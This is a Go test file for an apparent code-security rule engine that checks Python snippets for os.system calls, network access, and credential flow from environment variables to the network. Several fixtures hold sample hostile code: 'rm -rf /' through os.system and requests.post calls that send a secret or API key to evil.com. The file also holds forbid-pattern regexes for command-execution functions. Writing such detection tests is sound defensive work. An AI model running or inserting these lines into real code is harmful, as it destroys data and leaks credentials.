package ir

import (
	"fmt"
	"testing"
)

func TestIRRuleCallMatch(t *testing.T) {
	code := `import os
import requests

def attack():
    os.system("rm -rf /")
    requests.post("https://evil.com", data="leak")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("call_match.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewIRRuleEngine([]File{*file})

	rule := IRRule{
		ID:       "test-os-system",
		Name:     "检测 os.system 调用",
		Severity: "high",
		Layer:    "P0",
		Detection: IRDetection{
			Type:   "ir_call",
			PassIf: "no_match",
			Call: &IRCallMatch{
				FuncName: "os.system",
			},
		},
	}

	result := engine.Evaluate(rule)
	fmt.Printf("=== 调用匹配测试 ===\n")
	fmt.Printf("Rule: %s, Matched: %v, Blocked: %v\n", result.RuleID, result.Matched, result.Blocked)
	for _, f := range result.Findings {
		fmt.Printf("  - %s at %s\n", f.Description, f.Location)
	}

	if !result.Matched {
		t.Error("should match os.system call")
	}
	if !result.Blocked {
		t.Error("should block (pass_if=no_match, matched=true)")
	}
}

func TestIRRuleCategoryMatch(t *testing.T) {
	code := `import os
import requests

def attack():
    key = os.getenv("SECRET")
    requests.post("https://evil.com", data=key)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("cat_match.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewIRRuleEngine([]File{*file})

	rule := IRRule{
		ID:       "test-network-category",
		Name:     "检测网络访问类别",
		Severity: "medium",
		Layer:    "P1",
		Detection: IRDetection{
			Type:   "ir_category",
			PassIf: "no_match",
			Category: &IRCategoryMatch{
				Categories: []string{string(CatNetworkAccess)},
				MinCount:   1,
			},
		},
	}

	result := engine.Evaluate(rule)
	fmt.Printf("=== 类别匹配测试 ===\n")
	fmt.Printf("Rule: %s, Matched: %v\n", result.RuleID, result.Matched)
	for _, f := range result.Findings {
		fmt.Printf("  - %s\n", f.Description)
	}

	if !result.Matched {
		t.Error("should match network_access category")
	}
}

func TestIRRuleTaintFlowMatch(t *testing.T) {
	code := `import os
import requests

def exfiltrate():
    secret = os.getenv("API_KEY")
    requests.post("https://evil.com", json={"key": secret})
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("taint_flow.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewIRRuleEngine([]File{*file})

	rule := IRRule{
		ID:       "test-credential-exfil",
		Name:     "检测凭据外发",
		Severity: "high",
		Layer:    "P0",
		Detection: IRDetection{
			Type:   "ir_taint_flow",
			PassIf: "no_match",
			TaintFlow: &IRTaintFlowMatch{
				SourceCategory: "env_access",
				SinkCategory:   "network_access",
			},
		},
	}

	result := engine.Evaluate(rule)
	fmt.Printf("=== 污点流匹配测试 ===\n")
	fmt.Printf("Rule: %s, Matched: %v\n", result.RuleID, result.Matched)
	for _, f := range result.Findings {
		fmt.Printf("  - [%s] %s\n", f.Kind, f.Description)
	}

	if !result.Matched {
		t.Error("should detect taint flow from env to network")
	}
}

func TestIRRuleCompoundMatch(t *testing.T) {
	code := `import os
import requests

def attack():
    key = os.getenv("SECRET")
    requests.post("https://evil.com", data=key)
    os.system("cleanup")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("compound.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewIRRuleEngine([]File{*file})

	rule := IRRule{
		ID:       "test-compound",
		Name:     "检测网络+命令执行组合",
		Severity: "high",
		Layer:    "P0",
		Detection: IRDetection{
			Type:   "ir_compound",
			PassIf: "no_match",
			Compound: &IRCompoundMatch{
				Operator: "and",
				Conditions: []IRSubCondition{
					{
						Kind: "category",
						Category: &IRCategoryMatch{
							Categories: []string{string(CatNetworkAccess)},
						},
					},
					{
						Kind: "category",
						Category: &IRCategoryMatch{
							Categories: []string{string(CatCommandExec)},
						},
					},
				},
			},
		},
	}

	result := engine.Evaluate(rule)
	fmt.Printf("=== 复合匹配测试 ===\n")
	fmt.Printf("Rule: %s, Matched: %v\n", result.RuleID, result.Matched)

	if !result.Matched {
		t.Error("should match compound condition (network AND cmd_exec)")
	}
}

func TestIRRuleCompoundOR(t *testing.T) {
	code := `import os

def safe():
    print("hello")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("safe_or.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewIRRuleEngine([]File{*file})

	rule := IRRule{
		ID:       "test-compound-or",
		Name:     "检测网络或命令执行",
		Severity: "high",
		Detection: IRDetection{
			Type:   "ir_compound",
			PassIf: "no_match",
			Compound: &IRCompoundMatch{
				Operator: "or",
				Conditions: []IRSubCondition{
					{
						Kind: "category",
						Category: &IRCategoryMatch{
							Categories: []string{string(CatNetworkAccess)},
						},
					},
					{
						Kind: "category",
						Category: &IRCategoryMatch{
							Categories: []string{string(CatCommandExec)},
						},
					},
				},
			},
		},
	}

	result := engine.Evaluate(rule)
	fmt.Printf("=== OR 复合匹配测试 ===\n")
	fmt.Printf("Rule: %s, Matched: %v (expected false)\n", result.RuleID, result.Matched)

	if result.Matched {
		t.Error("safe code should not match OR condition")
	}
}

func TestCompileYAMLToIR(t *testing.T) {
	// 测试旧 YAML 规则编译为 IR 规则
	rule := CompileYAMLRuleToIR(
		"S2-01-001",
		"检查是否调用系统破坏命令",
		"high",
		"P0",
		"forbid_pattern",
		[]string{`os\.system\(`, `subprocess\.call\(`, `exec\.Command\(`},
		[]string{"**/*.py", "**/*.go", "**/*.js"},
	)

	if rule == nil {
		t.Fatal("should compile YAML rule to IR rule")
	}

	fmt.Printf("=== YAML→IR 编译测试 ===\n")
	fmt.Printf("ID: %s\n", rule.ID)
	fmt.Printf("Type: %s\n", rule.Detection.Type)
	fmt.Printf("PassIf: %s\n", rule.Detection.PassIf)
	if rule.Detection.Call != nil {
		fmt.Printf("Call.FuncName: %s\n", rule.Detection.Call.FuncName)
	}
	if rule.Detection.Category != nil {
		fmt.Printf("Categories: %v\n", rule.Detection.Category.Categories)
	}

	// 验证编译后的规则可以执行
	code := `import os
def bad():
    os.system("rm -rf /")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("compile_test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewIRRuleEngine([]File{*file})
	result := engine.Evaluate(*rule)
	fmt.Printf("Compiled rule result: matched=%v, blocked=%v\n", result.Matched, result.Blocked)

	if !result.Matched {
		t.Error("compiled rule should match os.system")
	}
}

func TestCompileYAMLCategoryFallback(t *testing.T) {
	// 测试复杂正则降级为类别匹配
	rule := CompileYAMLRuleToIR(
		"S2-01-002",
		"检测危险函数",
		"high",
		"P0",
		"forbid_pattern",
		[]string{`(?:os\.system|subprocess\.(?:call|run|Popen))`},
		[]string{"**/*.py"},
	)

	if rule == nil {
		t.Fatal("should compile YAML rule")
	}

	fmt.Printf("=== YAML→IR 降级测试 ===\n")
	fmt.Printf("Type: %s\n", rule.Detection.Type)
	if rule.Detection.Category != nil {
		fmt.Printf("Categories: %v\n", rule.Detection.Category.Categories)
	}
}

func TestIRRuleNoMatch(t *testing.T) {
	code := `import os
def safe():
    print("hello")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("no_match.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewIRRuleEngine([]File{*file})

	rule := IRRule{
		ID:       "test-no-match",
		Name:     "不应匹配安全代码",
		Severity: "high",
		Detection: IRDetection{
			Type:   "ir_call",
			PassIf: "no_match",
			Call: &IRCallMatch{
				FuncName: "os.system",
			},
		},
	}

	result := engine.Evaluate(rule)
	fmt.Printf("=== 无匹配测试 ===\n")
	fmt.Printf("Matched: %v, Blocked: %v\n", result.Matched, result.Blocked)

	if result.Matched {
		t.Error("should not match safe code")
	}
	if result.Blocked {
		t.Error("should not block when no match and pass_if=no_match")
	}
}

func TestIRRuleEvaluateAll(t *testing.T) {
	code := `import os
import requests

def attack():
    key = os.getenv("SECRET")
    requests.post("https://evil.com", data=key)
    os.system("cleanup")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("eval_all.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	engine := NewIRRuleEngine([]File{*file})

	rules := []IRRule{
		{
			ID:   "r1",
			Name: "检测网络访问",
			Detection: IRDetection{
				Type:   "ir_category",
				PassIf: "no_match",
				Category: &IRCategoryMatch{
					Categories: []string{string(CatNetworkAccess)},
				},
			},
		},
		{
			ID:   "r2",
			Name: "检测命令执行",
			Detection: IRDetection{
				Type:   "ir_category",
				PassIf: "no_match",
				Category: &IRCategoryMatch{
					Categories: []string{string(CatCommandExec)},
				},
			},
		},
		{
			ID:   "r3",
			Name: "检测凭据外发",
			Detection: IRDetection{
				Type:   "ir_taint_flow",
				PassIf: "no_match",
				TaintFlow: &IRTaintFlowMatch{
					SourceCategory: "env_access",
					SinkCategory:   "network_access",
				},
			},
		},
	}

	results := engine.EvaluateAll(rules)
	fmt.Printf("=== 批量执行测试 ===\n")
	for _, r := range results {
		fmt.Printf("  %s: matched=%v, blocked=%v\n", r.RuleID, r.Matched, r.Blocked)
	}

	blocked := 0
	for _, r := range results {
		if r.Blocked {
			blocked++
		}
	}
	if blocked < 2 {
		t.Errorf("expected at least 2 blocked rules, got %d", blocked)
	}
}
